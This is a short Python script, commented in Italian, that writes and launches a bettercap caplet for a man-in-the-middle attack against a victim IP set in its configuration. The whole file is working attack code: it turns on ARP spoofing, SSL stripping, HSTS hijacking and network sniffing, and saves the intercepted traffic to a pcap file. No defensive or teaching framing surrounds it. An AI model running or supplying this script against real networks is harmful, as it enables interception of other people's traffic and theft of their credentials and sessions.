import subprocess
import os

# --- CONFIGURAZIONE ---
IP_VITTIMA = "192.168.142.141"  # <--- METTI QUI L'IP DELLA VITTIMA
INTERFACCIA = "eth0"         # <--- CAMBIA SE USI IL WI-FI (es. wlan0)
# ----------------------

def avvia_attacco():
    caplet_name = "attack.cap"
    
    # Comandi originali + salvataggio su file pcap
    commands = [
        f"set http.proxy.sslstrip true",
        f"set net.sniff.local true",
        f"set net.sniff.output sessione_sniff.pcap", # Salva il traffico sniffato
        f"set arp.spoof.targets {IP_VITTIMA}",
        "net.probe on",
        "net.sniff on",
        "arp.spoof on",
        "http.proxy on",
        "hstshijack/hstshijack"
    ]

    try:
        # Scrittura file di configurazione
        with open(caplet_name, "w") as f:
            for cmd in commands:
                f.write(cmd + "\n")
        
        print(f"[*] Attacco avviato contro {IP_VITTIMA} su {INTERFACCIA}...")
        print("[*] I log del traffico verranno salvati in 'sessione_sniff.pcap'")
        
        # Esecuzione bettercap
        subprocess.run(["sudo", "bettercap", "-iface", INTERFACCIA, "-caplet", caplet_name])

    except KeyboardInterrupt:
        print("\n[-] Arresto in corso...")
    finally:
        if os.path.exists(caplet_name):
            os.remove(caplet_name)

if __name__ == "__main__":
    avvia_attacco()
